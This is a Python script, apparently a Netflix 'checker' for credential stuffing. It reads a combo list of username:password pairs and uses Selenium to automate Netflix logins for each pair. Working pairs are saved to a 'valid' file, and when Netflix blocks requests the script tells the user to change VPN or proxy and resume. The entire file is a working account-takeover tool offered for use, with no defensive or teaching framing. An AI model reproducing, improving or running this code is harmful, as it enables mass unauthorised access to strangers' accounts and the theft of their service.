import logging
import os
import sys
import time
from pathlib import Path

import requests
from countries import find_IP
from header import title, user_options
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys


BASE_DIR = Path(__file__).parent
COMBO_FILE = BASE_DIR / "netflix"
RESUME_FILE = BASE_DIR / "resume"


def iter_combos(combo_path: Path):
    """Yield username/password pairs from a combo file without loading it into memory."""

    with combo_path.open("r") as combo_list:
        for line_number, raw_line in enumerate(combo_list, start=1):
            stripped_line = raw_line.strip()
            if not stripped_line:
                continue
            if ":" not in stripped_line:
                logging.warning("Skipping line %s: missing ':' separator", line_number)
                continue

            username, raw_password = stripped_line.split(":", 1)
            password = raw_password.split()[0]
            if not username or not password:
                logging.warning("Skipping line %s: missing username or password", line_number)
                continue

            yield username, password


def count_combos(combo_path: Path) -> int:
    try:
        return sum(1 for _ in iter_combos(combo_path))
    except FileNotFoundError:
        print(
            "\n\n\033[38;5;255mCombo-list not found. Place it in the main directory,\nand make sure it's named 'netflix' (no file extension, or capitalization).\nEnding."
        )
        exit()


def combo_source():
    if RESUME_FILE.exists():
        return RESUME_FILE, True
    return COMBO_FILE, False


def write_resume(combo_path: Path, processed_count: int):
    with combo_path.open("r") as source, RESUME_FILE.open("w") as resume:
        for index, line in enumerate(source, start=1):
            if index > processed_count:
                resume.write(line)


details = [find_IP()[0], find_IP()[1], find_IP()[2]]
hits = 0
clear_page = 0

page = "https://www.netflix.com/login"
while True:
    logging.getLogger().setLevel(logging.CRITICAL)
    title()
    print("\n\033[38;5;7mCurrent IP: {} - Netflix's location: {}\n".format(details[0], details[1]))
    user_options()
    options = input("Pick an option: ")
    while True:
        if options == "1":
            combo_path, resume_flag = combo_source()
            hits = 0
            clear_page = 0
            total_combos = count_combos(combo_path)
            if total_combos == 0:
                print("\n\033[38;5;226mNo Accounts for current country.\n")
                break

            processed_count = 0
            title()
            if resume_flag:
                print("\033[38;5;7m\nResume file found. Resuming from given combo.")
            print("\n\033[38;5;7mCurrent IP: {} - Netflix's location: {}\n".format(details[0], details[1]))
            for username, password in iter_combos(combo_path):
                processed_count += 1
                try:
                    print(
                        "\033[38;5;7m\n\r\rConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m| Result: ".format(
                            str(processed_count), username, password.strip()), end=''
                    )
                    browser_options = Options()
                    browser_options.add_argument(
                        'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537'
                    )
                    browser = webdriver.Chrome(options=browser_options)
                    browser.set_window_size(500, 700)
                    browser.get(page)
                    time.sleep(0.7)
                    if browser.find_elements(By.XPATH, '//button[@id="onetrust-reject-all-handler"]'):
                        button = browser.find_element(By.XPATH, '//button[@id="onetrust-reject-all-handler"]')
                        button.click()
                        time.sleep(0.7)
                    if browser.find_elements(By.XPATH, '//button[@data-uia="login-toggle-button"]'):
                        if browser.find_element(By.XPATH, '//button[@data-uia="login-toggle-button"]').text == "Use password":
                            button = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[2]/div/form/button[2]')
                            button.click()
                    time.sleep(0.7)
                    login = browser.find_element(By.XPATH, '//input[@name="userLoginId"]')
                    password_field = browser.find_element(By.XPATH, '//input[@name="password"]')
                    login.send_keys(username)
                    time.sleep(0.7)
                    password_field.send_keys(password.strip())
                    time.sleep(0.7)
                    password_field.send_keys(Keys.TAB)
                    password_field.send_keys(Keys.ENTER)
                    time.sleep(0.7)
                    if browser.current_url == 'https://www.netflix.com/login' or browser.find_element(By.XPATH, '//div[@id="loginErrorMessage"]'):
                        print("\033[38;5;196m Invalid Account", end='')
                    if browser.current_url == 'https://www.netflix.com/browse' or browser.find_elements(By.XPATH, '//div[@class=\"profiles-gate-container\"]'):
                        print("\033[38;5;46m Valid Account - Stored", end='')
                        hits += 1
                        with open('valid', 'a') as valid:
                            valid.write("{}:{}\n".format(username, password))
                except Exception:
                    request = requests.get(page)
                    if request.status_code == 403:
                        print(
                            "\033[38;5;7m\nConnection Status:\033[38;5;190m Too many requests:\033[38;5;196m Access Denied \n\n\033[38;5;7mChange VPN/Proxy and start the checker again to resume from current combo.\n"
                        )
                        write_resume(combo_path, processed_count)
                        exit()
                if clear_page > 10:
                    title()
                    print("\n\033[38;5;7mCurrent IP: {} - Netflix's location: {}\n".format(details[0], details[1]))
                    clear_page = 0
                time.sleep(1)
                clear_page += 1
                browser.close()
                sys.stdout.write(
                    "\033[38;5;7m\x1b7\x1b[0;14fHits: %s Valid Accounts (Tried %s out of %s)\x1b8"
                    % (hits, str(processed_count), str(total_combos))
                )
                sys.stdout.flush()

            print("\n\033[38;5;226mAll done.")
            input("\n\033[38;5;226mPress Enter.")
            if RESUME_FILE.exists():
                os.remove('resume')
            break
        if options == "2":
            #Exit
            exit()
        else:
            break
